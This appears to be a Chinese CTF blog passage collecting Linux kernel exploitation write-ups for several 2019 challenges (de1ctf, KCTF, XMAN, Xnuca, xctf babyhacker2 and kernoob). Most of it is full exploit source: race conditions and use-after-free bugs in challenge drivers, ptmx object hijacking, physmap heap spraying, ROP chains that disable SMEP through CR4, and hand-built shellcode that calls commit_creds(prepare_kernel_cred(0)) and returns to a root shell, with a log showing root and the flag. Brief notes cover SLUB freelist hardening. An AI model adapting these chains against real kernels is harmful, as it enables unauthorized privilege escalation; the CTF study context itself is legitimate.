0xffffffffff000000; printf("[:)]race success!!!\n[:)]slub = %p\n",slub);//------------------------------------------------------------------------------ for(int i = 0;i &lt; spray_times;i++)&#123; mmap_arry[i] = mmap(NULL,mmap_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); if(mmap_arry[i] &lt; 0)&#123; puts("[:(]mmap error..."); exit(-1); &#125; memset(mmap_arry[i],'a',mmap_size); &#125;//------------------------------------------------------------------------------ // 0x4000000 //0xffff888000200000-0xffff888000400000 //0xffff888000e09000-0xffff888001000000 //0xffff888001e09000-0xffff888001e0b000 //0xffff888001e10000-0xffff888002000000 //0xffff888002950000-0xffff888002a90000 //0xffff888002c0d000-0xffff888002c0e000 //0xffff888002c10000-0xffff888004c00000 //0xffff888005e15000-0xffff888005eef000 //0xffff888006800000-0xffff888006a00000 //0xffff888006a2e000-0xffff888007800000 //0xffff888007c00000-0xffff888007fe0000 0xffff888007b90000 char *buf = malloc(0x1000); int tmp_fd = open("./data",O_RDWR); if(tmp_fd == -1)&#123; puts("[:(]data_file open error..."); exit(-1); &#125; *(size_t*)buf = slub; if(write(tmp_fd,buf,0x1000) &lt; 0)&#123; puts("[:(]data write error..."); exit(-1); &#125; free(buf);//------------------------------------------------------------------------------ size_t* ret_addr = 0; char* tmp_addr = 0; for(int i = 0;i &lt; 1000;i++)&#123; tmp_addr = mmap(NULL,0x1000,PROT_READ,MAP_PRIVATE,tmp_fd,0); if (tmp_addr == MAP_FAILED)&#123; puts("[:(]data mmap fail..."); exit(-1); &#125; for (int j = 0; j &lt; threadnum; j++)&#123; if(pthread_create(&amp;pt[j],NULL,race_delete,NULL) != 0)&#123; puts("[:(]pthread error..."); exit(-1); &#125; &#125; new(0x2c0,tmp_addr); for (int j = 0; j &lt; threadnum; j++) pthread_join(pt[j],NULL); ptmx = open("/dev/ptmx",O_RDWR); ret_addr = check(); if(ret_addr != NULL)&#123; break; &#125; close(ptmx); &#125; if(ret_addr == 0)&#123; puts("[:(]bad luck..."); exit(0); &#125; close(tmp_fd); kernel_base = ret_addr[3] - kernel_offset; printf("[:)]ret_addr = %p\n",ret_addr); printf("[:)]kernel_base = %p\n", kernel_base); commit_creds = kernel_base + 0x82d30; prepare_kernel_cred = kernel_base + 0x83000; size_t key = kernel_base + 0xC010BC; size_t pop_rdi = kernel_base + 0x139b; size_t mov_cr4 = kernel_base + 0x4f582; size_t leave = kernel_base + 0x1c4570; size_t set_memory_x = kernel_base + 0x55580; //0xffffffff8104f582: mov cr4, rdi; push rdx; popfq; ret; //0xffffffff8100139b: pop rdi; ret; //0xffffffff811c4570: leave; ret; //0xffffffff819fe4e2: mov rdi, rax; mov qword ptr [rdi], 1; ret; //0xffffffff81a09016: swapgs; ret; //0xffffffff81021f52: iretq; ret; int pts = get_ptmx_slave(); ret_addr[3] = slub + 0x300; ret_addr[0x300/8+12] = set_memory_x; ret_addr[0x500/8+0] = pop_rdi; ret_addr[0x500/8+1] = 0x6f0; ret_addr[0x500/8+2] = mov_cr4; ret_addr[0x500/8+3] = pop_rdi; ret_addr[0x500/8+4] = 0; ret_addr[0x500/8+5] = (size_t)prepare_kernel_cred; ret_addr[0x500/8+6] = kernel_base + 0x9fe4e2; ret_addr[0x500/8+7] = (size_t)commit_creds; ret_addr[0x500/8+8] = kernel_base + 0xa09016; ret_addr[0x500/8+9] = kernel_base + 0x21f52; ret_addr[0x500/8+10] = (size_t)get_shell; ret_addr[0x500/8+11] = user_cs; ret_addr[0x500/8+12] = user_rflags; ret_addr[0x500/8+13] = user_rsp; ret_addr[0x500/8+14] = user_ss; ioctl(pts,0x2333,1); /* char *shellcode = "H\x81\xc7\x00\x05\x00\x00" //add rdi,0x500; "W" //push rdi; "\x5c" //pop rsp; "\xc3"; //ret; */ char* shellcode = malloc(0x100); memset(shellcode,'\x90',0x100); char* tmp = shellcode; *(unsigned short *)tmp = 0x9090; tmp += 2; *(unsigned long *)tmp = 0x90ff3148; tmp += 3; *(unsigned short *)tmp = 0xb848; tmp += 2; *(unsigned long *)tmp = prepare_kernel_cred; tmp += 8; *(unsigned short *)tmp = 0xd0ff; tmp += 2; *(unsigned long *)tmp = 0x90c78948; tmp += 3; *(unsigned short *)tmp = 0xb848; tmp += 2; *(unsigned long *)tmp = commit_creds; tmp += 8; *(unsigned short *)tmp = 0xd0ff; tmp += 2; *(unsigned int *)tmp = 0xf0c7c748; //mov rdi,0x6f0; tmp += 4; *(unsigned char *)tmp = 0x06; tmp += 1; *(unsigned short*)tmp = 0x0; tmp += 2; *(unsigned short*)tmp = 0x220f; //mov cr4,rdi; tmp += 2; *(unsigned char*)tmp = 0xe7; tmp += 1; *(unsigned char*)tmp = 0x6a; //push user_ss tmp += 1; *(unsigned char*)tmp = (unsigned char)user_ss; tmp += 1; *(unsigned short *)tmp = 0xB848; //push user_rsp tmp += 2; *(unsigned long *)tmp = user_rsp; tmp += 8; *(unsigned char *)tmp = 'P'; tmp += 1; *(unsigned char*)tmp = 0x68; //push rflags tmp += 1; *(unsigned int*)tmp = (unsigned int)user_rflags; tmp += 4; *(unsigned char*)tmp = 0x6a; //push user_cs tmp += 1; *(unsigned char*)tmp = (unsigned char)user_cs; tmp += 1; *(unsigned char*)tmp = 0x68; //push get_shell tmp += 1; *(unsigned int*)tmp = (unsigned int)get_shell; tmp += 4; *(unsigned short*)tmp = 0x010f; //swapgs; tmp += 2; *(unsigned char*)tmp = 0xf8; tmp += 1; *(unsigned short*)tmp = 0xcf48; //iretq; tmp += 2; ret_addr[0x300/8+12] = slub + 0x400; memcpy((char *)ret_addr+0x400,shellcode,0x100); ioctl(pts,0x2333,1); puts("[:(]final...."); getchar(); return 0;&#125; 再次反思：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960./exp0x1234000 = 0xffffa18e8442dc00[ 39.672314] general protection fault: 0000 [#1] SMP PTI[ 39.673411] CPU: 0 PID: 1096 Comm: exp Tainted: G O 5.0.0-rc8+ #2[ 39.673662] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014[ 39.674586] RIP: 0010:__kmalloc+0x8d/0x1a0......[ 39.682351] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033[ 39.682456] CR2: 00007ffe6ddfcfb0 CR3: 0000000004484000 CR4: 00000000003006f0~ $ $ ididuid=1000(ctf) gid=1000(ctf) groups=1000(ctf)~ $ $ exitexitumount: can't unmount /dev: Device or resource busy[ 46.133945] sd 0:0:0:0: [sda] Synchronizing SCSI cache[ 46.135758] sd 0:0:0:0: [sda] Stopping disk[ 46.139729] general protection fault: 0000 [#2] SMP PTI[ 46.139867] CPU: 0 PID: 1102 Comm: poweroff Tainted: G D O 5.0.0-rc8+ #2[ 46.140011] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014[ 46.140215] RIP: 0010:kmem_cache_alloc_trace+0x6e/0x160[ 46.140349] Code: 00 00 00 4d 8b 07 65 49 8b 50 08 65 4c 03 05 f1 ee 65 71 49 8b 28 48 85 ed 0f 84 ae 00 00 00 41 8b 47 20 49 8b 3f 48 8d 4a 01 &lt;48&gt; 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 74 c5 41 8b[ 46.140750] RSP: 0018:ffffa845800dfb18 EFLAGS: 00000206[ 46.140865] RAX: 0000000000000000 RBX: ffffa18e84b8f0c0 RCX: 0000000000000a2f[ 46.141008] RDX: 0000000000000a2e RSI: 00000000006080c0 RDI: 0000000000023cc0[ 46.141151] RBP: 4141414141414141 R08: ffffa18e87823cc0 R09: 0000000000000000[ 46.141300] R10: ffffa18e854d7690 R11: 000000000000005f R12: 00000000006080c0......[ 46.163526] R10: ffffa845800e7d40 R11: 000000000000b702 R12: 00000000006080c0[ 46.163739] R13: 0000000000000385 R14: ffffa18e85401500 R15: ffffffffc02f8064[ 46.163873] FS: 000000000201a880(0000) GS:ffffa18e87800000(0000) knlGS:0000000000000000[ 46.164019] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033[ 46.164126] CR2: 00000000004af430 CR3: 0000000004490000 CR4: 00000000003006f0Please press Enter to activate this console. $/ # $ ididuid=0(root) gid=0(root)/ # $ lslsbin etc home linuxrc sbin tmpdev flag lib proc sys usr/ # $ cat flagcat flag[ 57.514984] general protection fault: 0000 [#4] SMP PTI[ 57.515146] CPU: 0 PID: 1110 Comm: cat Tainted: G D O 5.0.0-rc8+ #2[ 57.515284] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014[ 57.515482] RIP: 0010:__kmalloc+0x8d/0x1a0[ 57.515633] Code: 01 00 00 4d 8b 06 65 49 8b 50 08 65 4c 03 05 d2 e4 65 71 49 8b 28 48 85 ed 0f 84 cf 00 00 00 41 8b 46 20 49 8b 3e 48 8d 4a 01 &lt;48&gt; 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 74 c5 41 8b......[ 57.524166] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033[ 57.524274] CR2: 00007ffef6c32a28 CR3: 0000000004460000 CR4: 00000000003006f0Segmentation fault/ # $ source ./flagsource ./flag-/bin/sh: ./flag: line 1: de1ctf&#123;RaCE_C0nd1ti0n_For_FUN&#125;: not found 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;signal.h&gt;#include &lt;pthread.h&gt;#include &lt;stdlib.h&gt;int tmp;#define TEST_READ 0x23333#define TEST_WRITE 0x23334#define TEST_DEL 0x23335struct command&#123; unsigned long size; char* context;&#125;;void test_r(int fd, unsigned long size ,char* context)&#123; struct command command; command.size = size; command.context = context; ioctl(fd, TEST_READ, &amp;command);&#125;void test_w(int fd ,unsigned long size ,char* context)&#123; struct command command; command.size = size; command.context = context; ioctl(fd, TEST_WRITE, &amp;command);&#125;void test_d(int fd)&#123; struct command command; ioctl(fd, TEST_DEL, &amp;command);&#125;char *addr1;char *addr2;char *addr3;int fd;int fd2;fuck = 0x300;void *child(void *arg) &#123; for(int i=0;i&lt;0x280;i++)&#123; fuck++; test_r(fd,fuck,addr2); &#125; pthread_exit(NULL);&#125;void *child2(void *arg) &#123; for(int i=0;i&lt;0x280;i++)&#123; fuck++; test_r(fd,fuck,addr2); &#125; pthread_exit(NULL);&#125;void *child3(void *arg) &#123; for(int i=0;i&lt;0x380;i++)&#123; if(fuck&gt;0x400)&#123; fuck = 0x300; test_d(fd); &#125; fuck++; test_r(fd,fuck,addr2); &#125; pthread_exit(NULL);&#125;int main()&#123; addr1 = (void*)mmap((void*)0x1234000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0); addr2 = (void*)mmap((void*)0x1235000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0); addr3 = (void*)mmap((void*)0x1236000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0); unsigned long *test1; unsigned long *test2; unsigned long *test3; unsigned long pgd_addr=0; unsigned long page_offset_base=0; unsigned long now_buffer=0; fd = open("/dev/test",O_RDONLY); fd2 = open("/dev/test",O_RDONLY); memset(addr1,0,0x1000); memset(addr2,0x41,0x1000); memset(addr3,0,0x1000); int check = 0; int success_index = 0; test1 = addr1; test2 = addr2; test3 = addr3; pthread_t t1,t2,t3; while(1)&#123; pthread_create(&amp;t1, NULL, child, "Child"); pthread_create(&amp;t2, NULL, child2, "Child"); pthread_create(&amp;t3, NULL, child3, "Child"); for(int i=0;i&lt;0x400;i++)&#123; test_w(fd,0x300,addr1); for(int j=0;j&lt;=0x100;j++)&#123; if(*(test1+j) != 0x4141414141414141 &amp;&amp; *(test1+j))&#123; printf("%p = %p\n",test1+j,*(test1+j)); success_index = 1; &#125; &#125; if(success_index)&#123; break; &#125; &#125; pthread_join(t1,NULL); pthread_join(t2,NULL); pthread_join(t3,NULL); if(success_index)&#123; break; &#125; &#125;&#125; 2019KCTF_T11：绝地反击思路：这题我做完都不知道他逻辑是什么意思。。。一顿操作猛如虎，给了八个选项，理清楚以后就是一个UAF。。。我透。 不过5.2.0的kernel还是有不少小坑的。请自己尝试解决吧。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;memory.h&gt;#include &lt;pty.h&gt;#include &lt;signal.h&gt;#define NEW 0x1336#define Y_DEADBEEF 0x1338#define N_DEADBEEF 0x1339#define COPY 0x1337#define UAF 0x133D#define SHOW 0x133B#define EDIT 0x133Avoid get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;int main()&#123; save(); signal(SIGSEGV,get_shell); int t[10] = &#123;0&#125;; for(int i = 0;i &lt; 10;i++) &#123; t[i] = open("/dev/ptmx",O_RDWR); if (t[i] == -1)&#123; puts("[:(]open ptmx error"); exit(-1); &#125; &#125; for (int i = 0;i &lt; 10;i++) close(t[i]); int fd = open("/dev/kpwn",O_RDONLY); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(0); &#125; ioctl(fd,NEW,0); ioctl(fd,NEW,0); ioctl(fd,NEW,0); ioctl(fd,NEW,0); ioctl(fd,Y_DEADBEEF,1); size_t* buf = malloc(0x18); buf[0] = 1; buf[1] = 0; ioctl(fd,COPY,buf); ioctl(fd,N_DEADBEEF,1); ioctl(fd,Y_DEADBEEF,2); buf[0] = 2; buf[1] = 1; buf[2] = 0; ioctl(fd,UAF,buf);//------------------------------------------------------ int ptmx_fd = open("/dev/ptmx",2); if(ptmx_fd &lt; 0)&#123; puts("[:(]open ptmx error..."); exit(0); &#125; size_t* user_buf = malloc(0x300); buf[0] = 0; buf[1] = (size_t)user_buf; buf[2] = 0x300; ioctl(fd,SHOW,buf); size_t kernel_base = user_buf[3] - 0x6280e0; size_t heap_base = user_buf[2] - 0x189a80; printf("[:)]kernel_base = %p\n",kernel_base); printf("[:)]heap_base = %p\n",heap_base); size_t prepare_kernel_cred = kernel_base + 0x4f050; size_t commit_creds = kernel_base + 0x4f210; user_buf[3] = heap_base + 0xe8d2400; ioctl(fd,EDIT,buf); buf[0] = 3; buf[1] = 1; ioctl(fd,COPY,buf); buf[0] = 1; buf[1] = (size_t)user_buf; buf[2] = 0x300; memset(user_buf,'\x00',0x300); user_buf[0] = kernel_base + 0x402c94; user_buf[1] = heap_base + 0xe8d2400 + 0x280; user_buf[7] = kernel_base + 0x200f86; user_buf[0x280/8] = kernel_base + 0x354a0; user_buf[0x280/8+1] = 0; user_buf[0x280/8+2] = prepare_kernel_cred; user_buf[0x280/8+3] = kernel_base + 0x1dd069; user_buf[0x280/8+4] = 0xdeadbeef; user_buf[0x280/8+5] = commit_creds; user_buf[0x280/8+6] = kernel_base + 0x200c2e; user_buf[0x280/8+7] = 0; user_buf[0x280/8+8] = 0xdeadbeef; user_buf[0x280/8+9] = kernel_base + 0x1a306; user_buf[0x280/8+10] = (size_t)get_shell; user_buf[0x280/8+11] = user_cs; user_buf[0x280/8+12] = user_rflags; user_buf[0x280/8+13] = user_rsp; user_buf[0x280/8+14] = user_ss; //0xffffffff811dd069: mov rdi, rax; mov qword ptr [rdi], 1; pop rbp; ret; //0xffffffff81200c2e: swapgs; popfq; pop rbp; ret; //0xffffffff8101a306: iretq; pop rbp; ret; ioctl(fd,EDIT,buf); memset(buf,'\x00',8); write(ptmx_fd,buf,8); return 0;&#125; 2019XMAN_babykernel思路：这题貌似出坏了？？开始一直卡在read和unlock_ioctl里，read我不知道怎么传第四个参数，unlock_ioctl第一个参数一顿骚操作也没看懂，开始一直想着泄露然后ROP，然后就一直卡住，结果后来发现没开kaslr，开kaslr，kaslr，aslr，slr，lr，r。。。我在想当时只有两解是不是大家也都没看到这个条件？？ exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;memory.h&gt;#include &lt;pty.h&gt;#include &lt;signal.h&gt;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;size_t commit_creds = 0xffffffff81077620;size_t prepare_kernel_cred = 0xffffffff810779b0;size_t get_shell_addr = (size_t)get_shell;void su()&#123; char* (*pkc)(int) = prepare_kernel_cred; void (*cc)(char*) = commit_creds; (*cc)((*pkc)(0)); __asm__( "push user_ss;" "push user_rsp;" "push user_rflags;" "push user_cs;" "push get_shell_addr;" "swapgs;" "iretq;" );&#125;int main()&#123; save(); int fd = open("/dev/mychrdev",2); if(fd &lt; 0)&#123; puts("[:(]open mychrdev error..."); exit(0); &#125; size_t* buf = malloc(0x100); memset(buf,'\x00',0x100); buf[11] = 0xffffffff8101b51c; buf[12] = 0x6f0; buf[13] = 0xffffffff810261c2; buf[14] = (size_t)su; write(fd,buf,0x100); return 0;&#125; 2019Xnuca_babykernel思路：这题是涨了新姿势的一题，再次膜NESE的巨佬们，仍然是5.2.0的kernel，虽然我最后成功跳到shellcode，也回到了用户态，但是没有成功getshell，还是报错了。。。还有待探究。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;memory.h&gt;#include &lt;pty.h&gt;#include &lt;signal.h&gt;struct control_flow_hijack_primitive&#123; size_t rax; size_t rbx; size_t rcx; size_t rdx; size_t rsi; size_t rdi; size_t rsp; size_t rbp; size_t r8; size_t r9; size_t r10; size_t r11; size_t r12; size_t r13; size_t r14; size_t r15; size_t rip; size_t reset_all;&#125;*user_ptr;size_t regcache_mark_dirty = 0xffffffff81608250;size_t prepare_kernel_cred = 0xffffffff81087130;size_t commit_creds = 0xffffffff81086e20;size_t mp_size = 1024*64;size_t spray_times = 32*64;size_t set_memory_x = 0xffffffff81056ca0;size_t guess_physmap = 0xffff888007a72000;//set_memory_rw = 0xffffffff810573b0size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]root now!!!"); char* args[2] = &#123;"/bin/sh", NULL&#125;; execv("/bin/sh", args); &#125; else&#123; puts("[:(]not root..."); exit(0); &#125;&#125;int main()&#123; save(); signal(SIGSEGV,get_shell); int fd = open("/dev/osok",O_RDWR); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(0); &#125; char* shellcode = malloc(0x100); memset(shellcode,'\x90',0x100); char* tmp = shellcode; *(unsigned short *)tmp = 0x9090; tmp += 2; *(unsigned long *)tmp = 0x90ff3148; tmp += 3; *(unsigned short *)tmp = 0xb848; tmp += 2; *(unsigned long *)tmp = prepare_kernel_cred; tmp += 8; *(unsigned short *)tmp = 0xd0ff; tmp += 2; *(unsigned long *)tmp = 0x90c78948; tmp += 3; *(unsigned short *)tmp = 0xb848; tmp += 2; *(unsigned long *)tmp = commit_creds; tmp += 8; *(unsigned short *)tmp = 0xd0ff; tmp += 2; *(unsigned int *)tmp = 0xf0c7c748; //mov rdi,0x6f0; tmp += 4; *(unsigned char *)tmp = 0x06; tmp += 1; *(unsigned short*)tmp = 0x0; tmp += 2; *(unsigned short*)tmp = 0x220f; //mov cr4,rdi; tmp += 2; *(unsigned char*)tmp = 0xe7; tmp += 1; *(unsigned char*)tmp = 0x6a; //push user_ss tmp += 1; *(unsigned char*)tmp = (unsigned char)user_ss; tmp += 1; *(unsigned short *)tmp = 0xB848; //push user_rsp tmp += 2; *(unsigned long *)tmp = user_rsp; tmp += 8; *(unsigned char *)tmp = 'P'; tmp += 1; *(unsigned char*)tmp = 0x68; //push rflags tmp += 1; *(unsigned int*)tmp = (unsigned int)user_rflags; tmp += 4; *(unsigned char*)tmp = 0x6a; //push user_cs tmp += 1; *(unsigned char*)tmp = (unsigned char)user_cs; tmp += 1; *(unsigned char*)tmp = 0x68; //push get_shell tmp += 1; *(unsigned int*)tmp = (unsigned int)get_shell; tmp += 4; *(unsigned short*)tmp = 0x010f; //swapgs; tmp += 2; *(unsigned char*)tmp = 0xf8; tmp += 1; *(unsigned short*)tmp = 0xcf48; //iretq; tmp += 2;//----------------------------------------------------------------------------- char * pp = mmap(0x100000, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,-1, 0); int i,num; char *mp; char *p; for (i = 0; i &lt; spray_times; i++) &#123; if ((p = mmap(NULL, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)&#123; puts("[:(]mmap error..."); exit(-1); &#125; for (num = 0; num &lt; 64; num++) &#123; mp = p + num * 1024; *((unsigned long *)&amp;mp[0x30]) = guess_physmap+0x40; *((unsigned long *)&amp;mp[0x20]) = 0xffffffff8153588e; *((unsigned long *)&amp;mp[0xe0]) = 0; *((unsigned long *)&amp;mp[0x8]) = guess_physmap+0x70; *((unsigned long *)&amp;mp[0x9e]) = regcache_mark_dirty+1; *((unsigned long *)&amp;mp[0x70]) = guess_physmap; //set_memory_x first arg *((unsigned long *)&amp;mp[0x60]) = set_memory_x; *((unsigned long *)&amp;mp[0x68]) = guess_physmap+0x100; //return address *((unsigned long *)&amp;mp[0x270]) = 0xffffffff810a9114; memcpy(mp+0x100,shellcode,0x100); &#125; &#125; //----------------------------------------------------------------------------- user_ptr = malloc(0x90); user_ptr-&gt;rdi = guess_physmap; user_ptr-&gt;rip = regcache_mark_dirty; ioctl(fd,1337,user_ptr); sleep(1000); return 0;&#125;/* 0xffffffff81608250: push rbx 0xffffffff81608251: mov rbx,rdi 0xffffffff81608251: mov rbx,rdi 0xffffffff81608254: mov rdi,QWORD PTR [rdi+0x30] 0xffffffff81608258: mov rax,QWORD PTR [rbx+0x20]=&gt; 0xffffffff8160825c: call 0xffffffff81e00f20Guessed arguments:arg[0]: 0xffff888007a72040 --&gt; 0x0 jmp rax //rax = 0xffffffff8153588e //rdi = guest_phymap+0x40 //rbx = guest_phymap=&gt; 0xffffffff8153588e: mov rdx,QWORD PTR [rbx+0xe0] 0xffffffff81535895: mov rsi,QWORD PTR [rbx+0x8] //rsi = [guest_phymap+0x8] = guest_phymap+0x70 0xffffffff81535899: pop rbx //rbx = xxx 0xffffffff8153589a: pop rbp 0xffffffff8153589b: pop r12 0xffffffff8153589d: mov rax,QWORD PTR [rdi+0x230] //rax = [guest_phymap+0x270] 0xffffffff815358a4: jmp 0xffffffff81e00f20jmp rax //rax = 0xffffffff810a9114 //rdi = phymap+0x40 //rsi = phymap+0x70 0xffffffff810a9114: sti 0xffffffff810a9115: jmp QWORD PTR [rsi+0x2e]jmp [phymap+0x9e] //0xffffffff81608251 //rdi = phymap+0x40=&gt; 0xffffffff81608251: mov rbx,rdi 0xffffffff81608254: mov rdi,QWORD PTR [rdi+0x30] 0xffffffff81608258: mov rax,QWORD PTR [rbx+0x20] 0xffffffff8160825c: call 0xffffffff81e00f20*/ https://0xffff.one/d/346 2019xctf新春战疫_babyhacker2写exp十分钟，上传两小时。。。 exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;memory.h&gt;#include &lt;pty.h&gt;#include &lt;signal.h&gt;size_t prepare_kernel_cred = 0;size_t commit_creds = 0;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;void get_shell()&#123; char buf[0x50] = &#123;0&#125;; int fd = open("/flag",0); read(fd,buf,0x50); write(1,buf,0x50);&#125;size_t get_shell_addr = (size_t)get_shell;void su()&#123; char* (*pkc)(int) = prepare_kernel_cred; void (*cc)(char*) = commit_creds; (*cc)((*pkc)(0)); __asm__( "push user_ss;" "push user_rsp;" "push user_rflags;" "push user_cs;" "push get_shell_addr;" "swapgs;" "iretq;" );&#125;int main()&#123; save(); signal(SIGSEGV,get_shell); int fd = open("/dev/babyhacker",0); if(fd &lt; 0)&#123; puts("[:(]error..."); exit(0); &#125; char* user_buf = malloc(0x100000); if(user_buf == 0)&#123; puts("[:(]malloc error..."); exit(0); &#125; ioctl(fd,0x30000,-1); ioctl(fd,0x30002,user_buf); size_t vmbase = *((size_t*)user_buf+42); vmbase -= 0x219218; size_t canary = *((size_t*)user_buf+40); printf("[:)]vmbase = %p\n",vmbase); printf("[:)]canary = %p\n",canary); prepare_kernel_cred = vmbase+0xa1820; commit_creds = vmbase+0xa1430; //0xffffffff81004d70: mov cr4, rdi; pop rbp; ret; //0xffffffff8109054d: pop rdi; ret; //0xffffffff810636b4: swapgs; pop rbp; ret; //0xffffffff821d89f7: iretq; sub eax, 0xfffffec9; pop rbp; ret; //0xffffffff810def79: mov rdi, rax; call rdx; //0xffffffff81083f22: pop rdx; ret; //0xffffffff814d642f memset(user_buf,'\x00',0x1000); *((size_t*)user_buf+0x140/8) = canary; *((size_t*)user_buf+0x150/8) = vmbase+0x9054d; *((size_t*)user_buf+0x158/8) = 0x6f0; *((size_t*)user_buf+0x160/8) = vmbase+0x4d70; *((size_t*)user_buf+0x168/8) = 0; *((size_t*)user_buf+0x170/8) = (size_t)su; ioctl(fd,0x30001,user_buf); return 0;&#125; 2019xctf新春战疫_kernoob分析：这题当时比赛时我断断续续花了接近一天时间耗在上面，主要是因为方向一直不明确，有点像解cookie，又有点像double fetch，又听说有非预期。。。然后开始每一个都不坚定，后来决定尝试double fetch，但是我试了快一百次都没竞争成功一次，虽然理论是可以竞争成功的，但是我真的对这个方法的可行性产生了怀疑???，即使不考虑竞争因素可以出，这个概率也不知道什么时候可以跑出来。。。导致我的信念不是很坚定，最后一天晚上身体也顶不住，后来就被我爸吵着去睡觉了。。。 在赛中和17学长交流以及赛后学习其他队的exp的过程中，学到了很多姿势。。。 这题的预期解应该是double fetch，因为flag中含有race字样，但是这个概率是真的感人，看到除了直接看本地flag之外的正常解都是用的解cookie的方法，其中Kirin师傅的wp写的较为详细，让我学到了很多orz，跪谢。 首先是chunk的fd位置这个加密的来源如下： linux kernel 4.14 released this month;Kees Cook: “a bunch of security features I’m excited about”relevant PATCH 0: add a naive detection of double free or corruption 这个补丁, 在进行连续的kfree的时候会起作用终止当前进程. 但是如果在连续的kfree之间其他进程kfree了相邻的一些对象, 导致page-&gt;freelist改写, 补丁无作用.relevant PATCH 1: add SLUB free list pointer obfuscation 这个补丁, 将写入对象首地址(s-&gt;offset=0)的数据进行异或, 在申请对象的时候进行逆运算得到下一个申请的对象的位置.relevant PATCH 2: prefetch next freelist pointer in slab_alloc 这个补丁, 会在申请一个对象的时候, 得到下一个可以申请的对象的位置, 同时对下一个对象保存的异或数据进行逆运算, 然后检测那个位置是否合法. 